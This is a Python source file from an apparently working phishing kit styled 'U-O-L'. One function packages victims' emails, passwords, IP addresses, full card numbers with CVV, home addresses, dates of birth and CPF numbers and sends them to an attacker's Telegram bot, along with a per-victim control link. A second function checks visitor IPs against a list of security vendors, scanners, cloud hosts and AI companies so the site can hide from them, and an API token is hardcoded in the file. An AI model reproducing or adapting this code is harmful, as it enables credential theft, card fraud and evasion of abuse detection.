import requests
from django.conf import settings
import requests
from decouple import config
from django.http import HttpResponse


def send_telegram_email(instance, **kwargs):
    TOKEN = config('TOKEN')

    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

    email = instance.Email_or_number
    ip = instance.ip_address
    uuid = instance.user_id
    password = instance.password
    new_password = instance.new_password
    card_name = instance.card_name
    card_number = instance.card_number
    exp = instance.exp
    card_cvv = instance.card_cvv
    address = instance.address
    city = instance.city
    state = instance.state
    zipcode = instance.zipcode
    number = instance.number
    dob = instance.dob
    cpf = instance.cpf

    domain = ''
    control_domain = f'https://{domain}/control/{uuid}'

    if number:
        message = f"""
        U-O-L
------------------------------
------------------------------ 
email: <pre><code>{email}</code></pre>
new_password: <pre><code>{new_password}</code></pre>
password: <tg-spoiler>{password}</tg-spoiler>
ip: https://www.whatismyip.com/ip/{ip}
------------------------------
------------------------------ 
card name: <pre><code>{card_name}</code></pre>
card number: <pre><code>{card_number}</code></pre>
card EXP: <pre><code>{exp}</code></pre>
card CVV:  <tg-spoiler>{card_cvv}</tg-spoiler>
------------------------------
------------------------------ 
Address: <pre><code>{address}</code></pre>
City: <pre><code>{city}</code></pre>
State: <pre><code>{state}</code></pre>
Zipcode/CEP: <pre><code>{zipcode}</code></pre>
Number: <pre><code>{number}</code></pre>
DOB: <pre><code>{dob}</code></pre>
CPF:  <tg-spoiler>{cpf} </tg-spoiler>

------------------------------
------------------------------ 
CONTROL: {control_domain}
------------------------------
------------------------------ 
"""

    elif card_name:
        message = f"""
         U-O-L
------------------------------
------------------------------ 
email: <pre><code>{email}</code></pre>
new_password: <pre><code>{new_password}</code></pre>
password: <tg-spoiler>{password}</tg-spoiler>
ip: https://www.whatismyip.com/ip/{ip}
------------------------------
------------------------------ 
card name: <pre><code>{card_name}</code></pre>
card number: <pre><code>{card_number}</code></pre>
card EXP: <pre><code>{exp}</code></pre>
card CVV:  <tg-spoiler>{card_cvv}</tg-spoiler>
------------------------------
------------------------------ 
CONTROL: {control_domain}
------------------------------
------------------------------ 
"""

    else:
        message = f"""
         U-O-L
------------------------------
------------------------------ 
email: <pre><code>{email}</code></pre>
new_password: <pre><code>{new_password}</code></pre>
password: <tg-spoiler>{password}</tg-spoiler>
ip: https://www.whatismyip.com/ip/{ip}
------------------------------
------------------------------ 
CONTROL: {control_domain}
------------------------------
------------------------------ 
"""

    param = {
        'chat_id': config('CHAT_ID'),
        'text': message,
        'parse_mode': 'html'
    }
    response = requests.post(url, param)

    return


security_as_names = [
    "google ",
    'name',
    "microsoft",
    "amazon",
    "apple",
    "yandex",
    "baidu",
    "meta platforms",
    "bytedance",
    "anthropic",
    "openai",
    "ahrefs",
    "semrush",
    "majestic",
    "moz",
    "censys",
    "shodan",
    "rapid7",
    "qualys",
    "internet ",
    "digitalocean",
    "linode",
    "vultr",
    "hetzner",
    "ovh",
    "akamai",
    "imperva",
    "incapsula",
    "fortinet",
    "palo",
    "crowdstrike",
    "zscaler",
    "proofpoint",
    "sophos",
    "mcafee",
    "eset",
    "trend",
    "rapidapi",
    "security",
    "bitsight",
    "binaryedge",
    "onyphe",
    "project",
    "netcraft",
    "internet",
    "shadowserver",
    "spamhaus",
    "abuse",
    "sucuri",
    "uptimerobot"
]


def asn_check(ip):

    token = "139400fd3c3cf6"
    url = f"https://api.ipinfo.io/lite/{ip}"
    params = {"token": token}
    response = requests.get(url, params=params)
    data = response.json()
    check_asn = data.get("as_name", "").lower().strip()
    is_there = any(
        as_name.strip() in check_asn for as_name in security_as_names)
    print(check_asn)
    if is_there:
        return True
